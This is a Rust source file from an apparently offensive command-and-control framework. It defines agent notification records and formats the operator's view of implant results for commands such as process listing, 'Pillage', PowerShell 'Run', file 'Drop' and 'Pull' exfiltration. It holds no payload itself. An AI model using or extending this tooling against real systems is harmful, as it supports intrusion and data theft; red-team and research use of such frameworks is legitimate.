use std::path::{Path, PathBuf};

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use shared::{
    process::Process,
    tasks::{Command, PowershellOutput, WyrmResult},
};
use sqlx::FromRow;

pub const ADMIN_AUTH_SEPARATOR: &str = "=authdivider=";

/// The collective for multiple [`NotificationForAgent`].
pub type NotificationsForAgents = Vec<NotificationForAgent>;

/// A representation of in memory agents on the C2, being a tuple of:
/// - `String`: Agent display representation
/// - `bool`: Is stale
/// - `Option<Value>`: Any new notifications
pub type AgentC2MemoryNotifications = (String, bool, Option<Value>);

/// A representation of the database information pertaining to agent notifications which have not
/// yet been pulled by the operator.
#[derive(Debug, FromRow, Serialize, Deserialize)]
pub struct NotificationForAgent {
    pub completed_id: i32,
    pub task_id: i32,
    pub command_id: i32,
    pub agent_id: String,
    pub result: Option<String>,
    pub time_completed: DateTime<Utc>,
}

impl NotificationForAgent {
    pub fn format_console_output(&self) -> Vec<String> {
        match Command::from_u32(self.command_id as _) {
            Command::Sleep => {
                return vec!["Agent received task to adjust sleep time.".into()];
            }
            Command::Ps => {
                let listings_serialised = match self.result.as_ref() {
                    Some(inner) => inner,
                    None => {
                        return vec![format!("No data returned from ls command.")];
                    }
                };

                let deser: Option<Vec<Process>> =
                    serde_json::from_str(listings_serialised).unwrap();
                if deser.is_none() {
                    return vec![format!("Directory listings empty.")];
                }

                let mut builder = vec![];

                for row in deser.unwrap() {
                    builder.push(format!("{}: {}", row.pid, row.name));
                }

                return builder;
            }
            Command::GetUsername => (),
            Command::Pillage => {
                let result = match self.result.as_ref() {
                    Some(r) => r,
                    None => {
                        return vec!["No data.".into()];
                    }
                };

                let deser: Vec<String> = match serde_json::from_str(result) {
                    Ok(d) => d,
                    Err(e) => {
                        return vec![format!("Failed to deserialise results {e}.")];
                    }
                };

                return deser;
            }
            Command::UpdateSleepTime => (),
            Command::Undefined => {
                return vec!["Congrats, you found a bug. This should never print.".into()];
            }
            Command::Pwd => {
                let result = match self.result.as_ref() {
                    Some(r) => r,
                    None => {
                        return vec!["An error occurred with the data from pwd.".into()];
                    }
                };
                let s: String = match serde_json::from_str(result) {
                    Ok(s) => s,
                    Err(e) => format!(
                        "An error occurred whilst trying to unwrap. {e}. Data: {}",
                        result
                    ),
                };
                return vec![format!("{s}")];
            }
            Command::AgentsFirstSessionBeacon => (),
            Command::Cd => {
                let result = match self.result.as_ref() {
                    Some(r) => r,
                    None => {
                        return vec![format!("No data.")];
                    }
                };

                let deser: WyrmResult<PathBuf> = match serde_json::from_str(result) {
                    Ok(d) => d,
                    Err(e) => {
                        return vec![print_client_error(&format!(
                            "Ensure your request was properly formatted: {e}"
                        ))];
                    }
                };
                match deser {
                    WyrmResult::Ok(result) => return vec![result.as_path().try_strip_prefix()],
                    WyrmResult::Err(e) => return vec![print_client_error(&e)],
                }
            }
            Command::KillAgent => (),
            Command::Ls => {
                let listings_serialised = match self.result.as_ref() {
                    Some(inner) => inner,
                    None => {
                        return vec![format!("No data returned from ls command.")];
                    }
                };

                let deser: Option<Vec<PathBuf>> =
                    serde_json::from_str(listings_serialised).unwrap();
                if deser.is_none() {
                    return vec![format!("Directory listings empty.")];
                }

                let mut builder = vec![];

                for row in deser.unwrap() {
                    builder.push(row.as_path().try_strip_prefix());
                }

                return builder;
            }
            Command::Run => {
                let powershell_output: PowershellOutput = match self.result.as_ref() {
                    Some(result) => match serde_json::from_str(result) {
                        Ok(result) => result,
                        Err(e) => {
                            return vec![format!("Could not deser PowershellOutput result. {e}")];
                        }
                    },
                    None => {
                        return vec!["No output returned from PowerShell command.".into()];
                    }
                };

                if let Some(out) = powershell_output.stderr
                    && !out.is_empty()
                {
                    return vec![format!("stderr: {out}")];
                }

                if let Some(out) = powershell_output.stdout
                    && !out.is_empty()
                {
                    return vec![format!("stdout: {out}")];
                }
            }
            Command::KillProcess => match &self.result {
                Some(s) => {
                    let result: WyrmResult<String> = match serde_json::from_str(s) {
                        Ok(r) => r,
                        Err(e) => {
                            return vec![format!(
                                "Could not serialise result for KillProcess. {e}."
                            )];
                        }
                    };

                    match result {
                        WyrmResult::Ok(s) => {
                            return vec![format!("Successfully killed process ID {s}.")];
                        }
                        WyrmResult::Err(e) => {
                            return vec![format!(
                                "An error occurred whilst trying to kill a process. {e}"
                            )];
                        }
                    }
                }
                None => {
                    return vec![
                        "An unknown error occurred whilst trying to kill a process.".into(),
                    ];
                }
            },
            Command::Drop => match &self.result {
                Some(s) => {
                    let result: WyrmResult<String> = match serde_json::from_str(s) {
                        Ok(r) => r,
                        Err(e) => {
                            return vec![format!(
                                "Could not serialise result for KillProcess. {e}."
                            )];
                        }
                    };

                    if let WyrmResult::Err(e) = result {
                        return vec![format!(
                            "An error occurred whilst trying to drop a file. {e}"
                        )];
                    }

                    return vec![format!("File dropped successfully.")];
                }
                None => {
                    return vec!["An unknown error occurred whilst trying to drop a file.".into()];
                }
            },
            Command::Copy => {
                //
                // In the result we get back from the agent, Some("null") is representative of the success.
                // If `Some` != "null", contains a `WyrmError` that we can print.
                //
                if let Some(inner) = &self.result {
                    if inner == "null" {
                        return vec!["File copied.".into()];
                    }

                    if let Ok(e) = serde_json::from_str::<WyrmResult<String>>(inner) {
                        return vec![format!("An error occurred copying the file: {:?}", e)];
                    }
                }

                return vec!["Unknown state?.".into()];
            }
            Command::Move => {
                //
                // In the result we get back from the agent, Some("null") is representative of the success.
                // If `Some` != "null", contains a `WyrmError` that we can print.
                //
                if let Some(inner) = &self.result {
                    if inner == "null" {
                        return vec!["File moved.".into()];
                    }

                    if let Ok(e) = serde_json::from_str::<WyrmResult<String>>(inner) {
                        return vec![format!("An error occurred moving the file: {:?}", e)];
                    }
                }

                return vec!["Unknown state?.".into()];
            }
            Command::Pull => {
                if let Some(response) = &self.result {
                    if let Ok(msg) = serde_json::from_str::<String>(response) {
                        // If we had an error message from the implant
                        return vec![format!("Implant suffered error executing Pull. {msg}")];
                    } else {
                        return vec!["Unknown error.".into()];
                    }
                }

                return vec!["File exfiltrated successfully and can be found on the C2.".into()];
            }
        }

        match self.result.as_ref() {
            Some(result) => {
                vec![format!("{result:?}")]
            }
            None => {
                vec![format!("Action completed with no data to present.")]
            }
        }
    }
}

/// Prints a coloured error message to the console for use in viewing notifications on the agent.
fn print_client_error(msg: &str) -> String {
    format!("Error: {msg}")
}

#[derive(Debug, Clone, Default, Serialize, Deserialize, FromRow)]
pub struct StagedResourceData {
    pub agent_name: String,
    pub c2_endpoint: String,
    pub staged_endpoint: String,
    pub pe_name: String,
    pub sleep_time: i64,
    pub port: i16,
}

/// Converts a [`Command`] to a `String`
pub fn command_to_string(cmd: &Command) -> String {
    let c = match cmd {
        Command::Sleep => "Sleep",
        Command::Ps => "ListProcesses",
        Command::GetUsername => "GetUsername",
        Command::Pillage => "Pillage",
        Command::UpdateSleepTime => "UpdateSleepTime",
        Command::Pwd => "Pwd",
        Command::AgentsFirstSessionBeacon => "AgentsFirstSessionBeacon",
        Command::Cd => "Cd",
        Command::KillAgent => "KillAgent",
        Command::Ls => "Ls",
        Command::Run => "Run",
        Command::KillProcess => "KillProcess",
        Command::Drop => "Drop",
        Command::Undefined => "Undefined",
        Command::Copy => "Copy",
        Command::Move => "Move",
        Command::Pull => "Pull",
    };

    c.into()
}

trait StripCannon {
    fn try_strip_prefix(&self) -> String;
}

impl StripCannon for Path {
    /// Where a path has been canonicalised, try strip the Windows \\?\ prefix for pretty
    /// printing.
    //
    // If this function fails, it will return the original path as a `String`
    fn try_strip_prefix(&self) -> String {
        let s = self.to_string_lossy().into_owned();
        if s.starts_with(r"\\?\") {
            let stripped = s.strip_prefix(r"\\?\").unwrap_or(&s);
            stripped.into()
        } else {
            s.into()
        }
    }
}
